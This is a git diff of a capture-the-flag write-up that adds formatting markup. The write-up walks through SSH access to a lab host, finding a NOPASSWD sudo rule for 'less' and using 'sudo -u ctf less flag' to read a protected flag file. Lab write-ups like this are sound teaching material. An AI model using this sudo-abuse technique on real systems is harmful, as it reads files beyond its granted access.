@@ -23,6 +23,7 @@ We are given an SSH key and an endpoint to connect to. We can connect using SSH:
 ```bash
 ssh -i id_ecdsa user@35.239.205.196
 ```
+{: .ms-4 }
 
 ### 2. Privilege Escalation Vector
 
@@ -31,8 +32,10 @@ Once we are in as `user`, we can check our sudo privileges by running `sudo -l`:
 ```bash
 sudo -l
 ```
+{: .ms-4 }
 
 ![Terminal Output](/assets/img/ptgarage/ptg_sudoers/img_2_1.png)
+{: .ms-4 }
 
 **Output:**
 ```text
@@ -42,6 +45,7 @@ Matching Defaults entries for user on 20sudoers...:
 User user may run the following commands on 20sudoers...:
     (ctf : ctf) NOPASSWD: /usr/bin/less
 ```
+{: .ms-4 }
 
 We can see that we can run the command `less` as the user `ctf` without needing a password.
 
@@ -54,13 +58,16 @@ We can abuse this configuration to read the flag file, which is only readable by
 cat flag
 cat: flag: Permission denied
 ```
+{: .ms-4 }
 
 ```bash
 # Exploiting sudo permissions to read it as the 'ctf' user
 sudo -u ctf less flag
 ```
+{: .ms-4 }
 
 ![Flag Screenshot](/assets/img/ptgarage/ptg_sudoers/img_3_1.png)
+{: .ms-4 }
 
 The `less` pager opens and displays the flag:
 
@@ -68,6 +75,7 @@ The `less` pager opens and displays the flag:
 ctf{!ns3cur3_sud0}
 flag (END)
 ```
+{: .ms-4 }
 
 ### 4. Mitigation
 
